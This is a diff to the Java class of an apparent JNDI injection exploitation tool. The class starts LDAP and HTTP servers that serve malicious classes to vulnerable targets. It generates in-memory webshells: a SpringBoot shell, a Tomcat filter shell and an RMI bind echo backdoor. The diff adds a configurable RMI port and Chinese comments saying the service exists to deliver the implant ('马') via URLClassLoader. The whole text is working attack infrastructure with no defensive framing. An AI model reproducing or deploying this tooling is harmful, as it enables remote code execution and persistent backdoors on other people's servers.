@@ -18,13 +18,16 @@ import java.util.Random;
 import java.util.Scanner;
 
 public class Jndi {
-    //todo: rmi echo
     public static void ldapBase(HashMap<String, String> args){
         ldapServerStart(args);
-
     }
 
 
+    /*
+    * 目的就是起一个ldap服务
+    * 目前只支持UrlClassloader方式拉马
+    * 拉的马可以是自己生成class，放到webPath路径下，也可以用这里自动生成的内存马/Rmi echo
+    * */
     public static void ldapServerStart(HashMap<String, String> args){
         if (args.get("webPath")==null) {
             System.out.println("[-] Need \"webPath\" or \"className\"");
@@ -53,7 +56,6 @@ public class Jndi {
             jndiServerPort = Integer.parseInt(args.get("jndiServerPort"));
         }
 
-
         try {
             if (httpServerIp == null)
                 httpServerIp = InetAddress.getLocalHost().getHostAddress();
@@ -68,6 +70,7 @@ public class Jndi {
         String commandArg = args.get("commandArg");
         String header = args.get("header");
         String headerValue = args.get("headerValue");
+        String rmiExObjPort = args.get("rmiExObjPort") == null ?  Integer.toString(random.nextInt(30000) + 12000) : args.get("rmiExObjPort");
 
         if (url == null)
             url = Utils.randomString(4);
@@ -80,18 +83,17 @@ public class Jndi {
             args.put("filePath", webPath);
             System.out.println("[+] \"SpringBoot\" Memory Shell Generate: ");
             PostGenerate.dispatch(springBootClassDto, "classFile", args);
-
+            //Tomcat内存马
             ClassDto tomcatFilterClassDto = GenerateAttack.tomcatFilter(url, commandArg, header, headerValue, "6789");
             args.put("filePath", webPath);
             System.out.println("[+] \"Tomcat Filter 6,7,8,9\" Memory Shell Generate: ");
             PostGenerate.dispatch(tomcatFilterClassDto, "classFile", args);
-
-            int randomPort = random.nextInt(30000) + 12000;
-
-            ClassDto rmiBindEcho = RmiBind.bind(randomPort);
-            args.put("filePath", webPath);
+            //Rmi Echo
+            ClassDto rmiBindEcho = RmiBind.bind(rmiExObjPort);
             System.out.println("[+] \"Rmi Bind Echo\" Memory Shell Generate: ");
-            System.out.println("[+] RMI Port: " + randomPort);
+            System.out.println("[+] Remote Object Bind Port: " + rmiExObjPort);
+
+            args.put("filePath", webPath);
             PostGenerate.dispatch(rmiBindEcho, "classFile", args);
 
         } catch (Exception e) {
@@ -104,6 +106,7 @@ public class Jndi {
         Scanner scanner = new Scanner(System.in);
         String userClassName = scanner.next();
 
+        //run http server
         final String httpAddress = httpServerIp;
         final int httpPort = httpServerPort;
         final String ldapAddress = jndiServerIp;
